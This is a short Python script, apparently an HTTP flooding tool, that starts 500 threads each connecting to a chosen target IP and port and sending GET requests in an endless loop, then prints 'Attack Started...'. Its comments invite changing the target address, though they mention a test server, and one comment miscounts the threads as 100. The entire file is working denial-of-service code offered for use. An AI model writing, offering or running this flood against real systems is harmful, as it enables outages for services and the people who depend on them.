import socket
import threading

# Target server details
TARGET = "127.0.0.1"  # Change this to the IP of your target
PORT = 8080  # Change to match your test server

# Function to send requests
def attack():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET, PORT))
        while True:
            s.send(b"GET / HTTP/1.1\r\nHost: TARGET\r\n\r\n")  # Keep sending requests
    except:
        pass
 # Ignore errors

# Launch multiple attack threads
for _ in range(500):  # 100 concurrent threads
    thread = threading.Thread(target=attack)
    thread.start()

print("Attack Started...")  # Notify user
